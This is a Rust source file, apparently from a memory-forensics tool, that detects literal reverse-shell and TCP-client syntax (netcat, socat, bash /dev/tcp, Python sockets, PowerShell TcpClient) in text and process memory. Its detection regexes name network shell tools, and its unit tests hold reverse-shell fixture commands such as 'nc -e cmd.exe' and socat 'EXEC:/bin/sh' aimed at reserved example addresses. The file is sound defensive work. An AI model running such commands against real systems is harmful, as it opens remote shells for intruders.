//! Literal connection syntax. No command is executed or resolved through DNS.
use super::{super::record, command_tokens};
use crate::volatility::Record;
use regex::Regex;
use serde_json::json;
use std::{net::IpAddr, sync::OnceLock};

pub(super) fn target(host: &str, port: u16) -> Option<(String, String)> {
    if port == 0 {
        return None;
    }
    let host = host.trim_matches(['[', ']']);
    if let Ok(ip) = host.parse::<IpAddr>() {
        return Some(("IP".into(), ip.to_string()));
    }
    match url::Host::parse(host).ok()? {
        url::Host::Domain(name)
            if name.len() <= 253
                && name.split('.').all(|p| {
                    !p.is_empty()
                        && p.len() <= 63
                        && !p.starts_with('-')
                        && !p.ends_with('-')
                        && p.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
                }) =>
        {
            Some(("Hostname".into(), name))
        }
        _ => None,
    }
}
fn finding(program: &str, kind: &str, host: &str, port: &str, context: &str) -> Option<Record> {
    let port = port.parse::<u16>().ok()?;
    let (key, host) = target(host, port)?;
    let mut row = record(
        json!({"Program":program,"Finding":kind,"Port":port,"Context":context,"Protocol":"TCP","Validation":"Literal program connection syntax; no execution established","Interpretation":"Recovered program syntax names this target. It may be documentation, unused code or historical text. Execution and successful communication require separate evidence."}),
    );
    row.fields.insert(key, host.into());
    Some(row)
}
pub(in crate::analysis) fn discovery_pattern() -> String {
    let wide = |s: &str| {
        s.bytes()
            .map(|b| format!("\\x{b:02x}\\x00"))
            .collect::<String>()
    };
    let mut patterns = vec![
        r#"\b(?:ncat|netcat|nc|socat)(?:\.exe)?["']?\s+"#.into(),
        r"\bTcpClient(?:\s*\(|\]::new\s*\()".into(),
        r"\bsocket\.(?:socket|create_connection)\s*\(".into(),
        regex::escape("/dev/tcp/"),
    ];
    for name in ["ncat", "netcat", "nc", "socat"] {
        patterns.push(format!(
            "{}(?:{})?(?:{}|{})?(?:\\x20\\x00|\\x09\\x00)+",
            wide(name),
            wide(".exe"),
            wide("\""),
            wide("'")
        ));
    }
    for name in [
        "TcpClient",
        "TcpClient]::new",
        "socket.socket",
        "socket.create_connection",
    ] {
        patterns.push(format!(
            "{}(?:\\x20\\x00|\\x09\\x00)*{}",
            wide(name),
            wide("(")
        ));
    }
    patterns.push(wide("/dev/tcp/"));
    patterns.join("|")
}

/// Keep short nc markers only when followed by printable command context.
/// The final parser still uses the broad markers above, and longer/scripting
/// markers retain their fallback coverage during discovery.
pub(in crate::analysis) fn candidate_pattern() -> String {
    let pattern = discovery_pattern();
    let pattern = pattern.replacen(
        r#"\b(?:ncat|netcat|nc|socat)(?:\.exe)?["']?\s+"#,
        r#"\b(?:ncat|netcat|socat)(?:\.exe)?["']?[ \t]+|\bnc(?:\.exe)?["']?[ \t]+[\x09\x20-\x7e]{1,4096}[ \t]+["']?[0-9]{1,5}"#,
        1,
    );
    // A UTF-16 command needs a complete token boundary and printable argument
    // context containing a numeric port, just like the narrow short spelling.
    pattern.replace(
        r"\x6e\x00\x63\x00(?:\x2e\x00\x65\x00\x78\x00\x65\x00)?(?:\x22\x00|\x27\x00)?(?:\x20\x00|\x09\x00)+",
        r"(?:^|[^A-Za-z0-9_\x00]\x00|[^\x00])\x6e\x00\x63\x00(?:\x2e\x00\x65\x00\x78\x00\x65\x00)?(?:\x22\x00|\x27\x00)?(?:\x20\x00|\x09\x00)+(?:[\x09\x20-\x7e]\x00){1,2048}(?:\x20\x00|\x09\x00)+(?:\x22\x00|\x27\x00)?(?:[0-9]\x00){1,5}",
    )
}
pub(in crate::analysis) fn scan_text(
    bytes: &[u8],
    core: std::ops::Range<usize>,
) -> Vec<(usize, usize, &'static str, Record)> {
    static MARKERS: OnceLock<regex::bytes::Regex> = OnceLock::new();
    let markers = MARKERS.get_or_init(|| {
        regex::bytes::Regex::new(&format!("(?i-u)(?:{})", discovery_pattern())).unwrap()
    });
    let mut seen = std::collections::BTreeSet::new();
    let mut rows = Vec::new();
    for hit in markers
        .find_iter(bytes)
        .filter(|h| core.contains(&h.start()))
    {
        let wide = bytes.get(hit.start() + 1) == Some(&0);
        let step = if wide { 2 } else { 1 };
        let unit = |at: usize| -> Option<u8> {
            let b = *bytes.get(at)?;
            if wide && *bytes.get(at + 1)? != 0 {
                return None;
            }
            (b.is_ascii_graphic() || matches!(b, b' ' | b'\t')).then_some(b)
        };
        let mut start = hit.start();
        while start >= step && hit.start() - start < 2048 && unit(start - step).is_some() {
            start -= step;
        }
        let mut end = start;
        let mut text = String::new();
        while end - start < 4096 {
            let Some(ch) = unit(end) else { break };
            text.push(char::from(ch));
            end += step;
        }
        if !seen.insert((start, end)) {
            continue;
        }
        let encoding = if wide { "UTF-16LE" } else { "UTF-8" };
        for mut row in parse(&text) {
            row.fields.insert(
                "Finding".into(),
                format!("Process memory {}", row.text("Finding")).into(),
            );
            rows.push((start, end - start, encoding, row));
        }
    }
    rows
}
fn segments(text: &str) -> Vec<&str> {
    let mut result = Vec::new();
    let mut start = 0;
    let mut quote = None;
    for (at, ch) in text.char_indices() {
        if matches!(ch, '\'' | '"') && quote.is_none_or(|q| q == ch) {
            quote = if quote.is_none() { Some(ch) } else { None };
        } else if quote.is_none() && matches!(ch, ';' | '&' | '|' | '\n' | '\r') {
            result.push(&text[start..at]);
            start = at + ch.len_utf8();
        }
    }
    result.push(&text[start..]);
    result
}
fn ncat(text: &str, rows: &mut Vec<Record>) {
    for segment in segments(text) {
        let tokens = command_tokens(segment);
        let Some(index) = tokens.iter().position(|t| {
            matches!(
                t.rsplit(['\\', '/'])
                    .next()
                    .unwrap_or("")
                    .to_ascii_lowercase()
                    .as_str(),
                "nc" | "nc.exe" | "ncat" | "ncat.exe" | "netcat" | "netcat.exe"
            )
        }) else {
            continue;
        };
        let mut positional = Vec::new();
        let mut exec = false;
        let mut listen = false;
        let mut udp = false;
        let mut valid = true;
        let mut args = tokens[index + 1..].iter();
        while let Some(arg) = args.next() {
            let (option, inline) = arg
                .split_once('=')
                .map_or((arg.as_str(), None), |(k, v)| (k, Some(v)));
            match option {
                "-e" | "-c" | "--exec" | "--sh-exec" | "--lua-exec" => {
                    exec = true;
                    if inline.is_none() && args.next().is_none() {
                        valid = false;
                        break;
                    }
                }
                "-l" | "--listen" => listen = true,
                "-u" | "--udp" => udp = true,
                "-p" | "-w" | "-i" | "-s" | "--source-port" | "--source" | "--proxy"
                | "--proxy-type" | "--proxy-auth" | "--ssl-cert" | "--ssl-key"
                | "--ssl-trustfile" => {
                    if inline.is_none() && args.next().is_none() {
                        valid = false;
                        break;
                    }
                }
                "--ssl" | "--ssl-verify" | "--send-only" | "--recv-only" | "--no-shutdown"
                | "--verbose" | "--keep-open" | "--nodns" => {}
                value if value.starts_with('-') => {
                    if value.starts_with("--")
                        || !value[1..].chars().all(|c| {
                            matches!(c, 'v' | 'n' | 'l' | 'k' | 'z' | 'u' | '4' | '6' | 't')
                        })
                    {
                        valid = false;
                        break;
                    }
                    listen |= value.contains('l');
                    udp |= value.contains('u');
                }
                _ => positional.push(arg.as_str()),
            }
        }
        if valid
            && !listen
            && positional.len() == 2
            && let Some(mut row) = finding(
                "Ncat/netcat",
                if exec {
                    "Reverse shell command candidate"
                } else {
                    "TCP client command"
                },
                positional[0],
                positional[1],
                segment,
            )
        {
            if udp {
                row.fields.insert("Protocol".into(), "UDP".into());
                if !exec {
                    row.fields
                        .insert("Finding".into(), "UDP client command".into());
                }
            }
            rows.push(row);
        }
    }
}
pub(super) fn parse(text: &str) -> Vec<Record> {
    let mut rows = Vec::new();
    ncat(text, &mut rows);
    static TCP: OnceLock<Regex> = OnceLock::new();
    let tcp=TCP.get_or_init(||Regex::new(r#"(?i)(?:net\.sockets\.)?tcpclient\s*\(\s*['"](?P<host>[^'"\s]+)['"]\s*,\s*(?P<port>[0-9]{1,5})\s*\)"#).unwrap());
    for c in tcp.captures_iter(text) {
        let lower = text.to_ascii_lowercase();
        let shell = lower.contains("iex")
            || lower.contains("invoke-expression")
            || lower.contains("cmd.exe");
        if let Some(row) = finding(
            "PowerShell/.NET",
            if shell {
                "Reverse shell command candidate"
            } else {
                "TCP client command"
            },
            &c["host"],
            &c["port"],
            text,
        ) {
            rows.push(row);
        }
    }
    static SOCAT: OnceLock<Regex> = OnceLock::new();
    let re = SOCAT.get_or_init(|| {
        Regex::new(
            r"(?i)^TCP(?:4|6)?:(?P<host>\[[0-9a-f:]+\]|[^:,\s]+):(?P<port>[0-9]{1,5})(?:,|$)",
        )
        .unwrap()
    });
    for segment in segments(text) {
        let tokens = command_tokens(segment);
        let Some(index) = tokens.iter().position(|t| {
            matches!(
                t.rsplit(['\\', '/'])
                    .next()
                    .unwrap_or("")
                    .to_ascii_lowercase()
                    .as_str(),
                "socat" | "socat.exe"
            )
        }) else {
            continue;
        };
        let shell = tokens[index + 1..].iter().any(|t| {
            t.to_ascii_uppercase().starts_with("EXEC:")
                || t.to_ascii_uppercase().starts_with("SYSTEM:")
        });
        for token in &tokens[index + 1..] {
            if let Some(c) = re.captures(token)
                && let Some(row) = finding(
                    "socat",
                    if shell {
                        "Reverse shell command candidate"
                    } else {
                        "TCP client command"
                    },
                    &c["host"],
                    &c["port"],
                    segment,
                )
            {
                rows.push(row);
            }
        }
    }
    static BASH: OnceLock<Regex> = OnceLock::new();
    for c in BASH
        .get_or_init(|| {
            Regex::new(r#"[<>]&?\s*/dev/tcp/(?P<host>[^/\s'";|&]+)/(?P<port>[0-9]{1,5})\b"#)
                .unwrap()
        })
        .captures_iter(text)
    {
        if let Some(row) = finding(
            "Bash",
            "Shell TCP redirection reference",
            &c["host"],
            &c["port"],
            text,
        ) {
            rows.push(row);
        }
    }
    static PYTHON: OnceLock<Regex> = OnceLock::new();
    let python=PYTHON.get_or_init(||Regex::new(r#"(?P<object>[a-zA-Z_][a-zA-Z0-9_]*)\.(?P<method>connect|create_connection)\s*\(\s*\(\s*['"](?P<host>[^'"\s]+)['"]\s*,\s*(?P<port>[0-9]{1,5})\s*\)"#).unwrap());
    static SOCKET: OnceLock<Regex> = OnceLock::new();
    let constructor = SOCKET.get_or_init(|| {
        Regex::new(
            r"\b(?P<var>[a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*socket\.socket\s*\((?P<args>[^)]{0,512})\)",
        )
        .unwrap()
    });
    static ASSIGNMENT: OnceLock<Regex> = OnceLock::new();
    let assignment =
        ASSIGNMENT.get_or_init(|| Regex::new(r"\b(?P<var>[a-zA-Z_][a-zA-Z0-9_]*)\s*=").unwrap());
    for c in python.captures_iter(text) {
        let at = c.get(0).unwrap().start();
        let prefix = &text[..at];
        let mut udp = false;
        let recognized = if &c["method"] == "create_connection" {
            &c["object"] == "socket"
        } else {
            let binding = constructor
                .captures_iter(prefix)
                .filter(|b| b["var"] == c["object"])
                .last();
            let latest = assignment
                .captures_iter(prefix)
                .filter(|b| b["var"] == c["object"])
                .last();
            match (binding, latest) {
                (Some(binding), Some(latest))
                    if binding.get(0).unwrap().start() == latest.get(0).unwrap().start() =>
                {
                    udp = binding["args"].contains("SOCK_DGRAM");
                    binding["args"].trim().is_empty()
                        || binding["args"].contains("SOCK_STREAM")
                        || udp
                }
                _ => false,
            }
        };
        if recognized
            && let Some(mut row) = finding(
                "Python socket",
                "TCP client command",
                &c["host"],
                &c["port"],
                text,
            )
        {
            if udp {
                row.fields.insert("Protocol".into(), "UDP".into());
                row.fields
                    .insert("Finding".into(), "UDP client command".into());
            }
            rows.push(row);
        }
    }
    static PS: OnceLock<Regex> = OnceLock::new();
    let ps=PS.get_or_init(||Regex::new(r#"(?i)\[(?:system\.)?net\.sockets\.tcpclient\]::new\s*\(\s*['"](?P<host>[^'"\s]+)['"]\s*,\s*(?P<port>[0-9]{1,5})\s*\)"#).unwrap());
    for c in ps.captures_iter(text) {
        if let Some(row) = finding(
            "PowerShell/.NET",
            "TCP client command",
            &c["host"],
            &c["port"],
            text,
        ) {
            rows.push(row);
        }
    }
    rows
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn tool_targets_are_scoped_and_listen_addresses_are_not_remote() {
        let rows = parse(
            "ncat --exec=cmd.exe --proxy proxy.example:8080 192.0.2.5 5059; echo 192.0.2.9 9999",
        );
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].text("IP"), "192.0.2.5");
        assert!(parse("nc -lv -e cmd.exe 192.0.2.5 5059").is_empty());
        assert!(parse("nc -e cmd.exe; echo 192.0.2.5 5059").is_empty());
        assert!(parse("ncat --unknown 192.0.2.5 5059").is_empty());
        assert_eq!(
            parse("ncat example.test 443")[0].text("Hostname"),
            "example.test"
        );
    }
    #[test]
    fn discovery_avoids_crt_symbols_and_preserves_wide_commands() {
        let markers =
            regex::bytes::Regex::new(&format!("(?i-u)(?:{})", discovery_pattern())).unwrap();
        assert!(!markers.is_match(b"strncat\0TcpClient\0socket.io\0"));
        let text = "ncat.exe -e cmd.exe 192.0.2.5 5059\0";
        let wide: Vec<_> = text.encode_utf16().flat_map(u16::to_le_bytes).collect();
        let rows = scan_text(&wide, 0..wide.len());
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].2, "UTF-16LE");
        assert_eq!(rows[0].3.text("Port"), "5059");
    }

    #[test]
    fn candidate_context_rejects_short_noise_and_keeps_supported_commands() {
        let re = regex::bytes::Regex::new(&format!("(?i-u)(?:{})", candidate_pattern())).unwrap();
        for text in ["nc\n\x0c", "nc \0", "sync 80 443", "strnc 192.0.2.5 5059"] {
            assert!(!re.is_match(text.as_bytes()), "{text:?}");
            let wide: Vec<_> = text.encode_utf16().flat_map(u16::to_le_bytes).collect();
            assert!(!re.is_match(&wide), "wide {text:?}");
        }
        for text in [
            "nc 192.0.2.5 5059",
            "nc -e cmd.exe 192.0.2.5 5059",
            "\"C:\\tools\\nc.exe\" -nv example.test 443 -e cmd.exe",
            "nc -p 1234 [2001:db8::5] 5059",
            "ncat --exec=cmd.exe example.test 443",
            "socat TCP:example.test:443 EXEC:cmd.exe",
            "[System.Net.Sockets.TcpClient]::new('192.0.2.5',5059)",
            "s=socket.socket();s.connect(('192.0.2.5',5059))",
            "bash -c 'exec 3<>/dev/tcp/192.0.2.5/5059'",
        ] {
            assert!(!parse(text).is_empty(), "fixture must be supported: {text}");
            assert!(re.is_match(text.as_bytes()), "{text}");
            let wide: Vec<_> = text.encode_utf16().flat_map(u16::to_le_bytes).collect();
            assert!(re.is_match(&wide), "wide {text}");
        }
    }
    #[test]
    fn scripting_syntax_requires_explicit_targets() {
        assert_eq!(
            parse("socat TCP6:[2001:db8::5]:5059 EXEC:'/bin/sh -li'")[0].text("IP"),
            "2001:db8::5"
        );
        assert!(parse("socat TCP-LISTEN:5059 EXEC:/bin/sh").is_empty());
        assert_eq!(
            parse("bash -c 'exec 3<>/dev/tcp/192.0.2.5/5059'")[0].text("Program"),
            "Bash"
        );
        assert!(parse("cat /dev/tcp/192.0.2.5/5059").is_empty());
        assert_eq!(
            parse("s=socket.socket();s.connect(('192.0.2.5',5059))")[0].text("Program"),
            "Python socket"
        );
        assert!(parse("other.connect(('192.0.2.5',5059))").is_empty());
        assert!(parse("s=socket.socket();s=other;s.connect(('192.0.2.5',5059))").is_empty());
        assert_eq!(
            parse(
                "s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(('192.0.2.5',5059))"
            )[0]
            .text("Protocol"),
            "UDP"
        );
        assert_eq!(
            parse("socket.create_connection(('example.test',443))")[0].text("Hostname"),
            "example.test"
        );
        assert_eq!(
            parse("[System.Net.Sockets.TcpClient]::new('192.0.2.5',5059)")[0].text("Port"),
            "5059"
        );
    }
}
